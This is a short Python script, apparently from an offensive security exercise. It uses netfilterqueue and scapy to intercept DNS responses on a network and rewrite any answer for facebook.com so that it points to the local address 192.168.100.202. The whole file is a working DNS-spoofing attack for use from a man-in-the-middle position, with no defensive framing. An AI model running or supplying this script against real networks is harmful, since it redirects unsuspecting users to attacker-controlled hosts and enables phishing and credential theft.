#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import signal
import sys

def def_handler(sig, frame):
    print(f"\n[!] Aborting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_package(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if b"facebook.com" in qname:
            print(f"\n[+] Poisioning facebook.com domain")

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.202")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_package)
queue.run()
